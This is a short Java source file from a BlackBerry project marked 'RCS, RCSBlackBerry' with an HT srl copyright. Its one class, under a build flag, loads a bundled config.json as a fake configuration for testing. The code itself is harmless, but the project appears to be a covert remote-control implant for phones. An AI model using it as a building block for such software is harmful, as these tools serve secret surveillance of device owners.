//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package fake;

import java.io.InputStream;

import blackberry.Messages;
import blackberry.utils.Utils;

public class InstanceConfigFake {
    public static String getJson() {
        //#ifdef FAKECONF

        try {
            InputStream stream = Messages.class.getClass().getResourceAsStream(
                    "/config.json");
            byte[] buffer = Utils.inputStreamToBuffer(stream);
            String config = new String(buffer);
            return config;
        } catch (Exception ex) {
            return null;
        }
        //#else
        return null;

        //#endif
    }

}
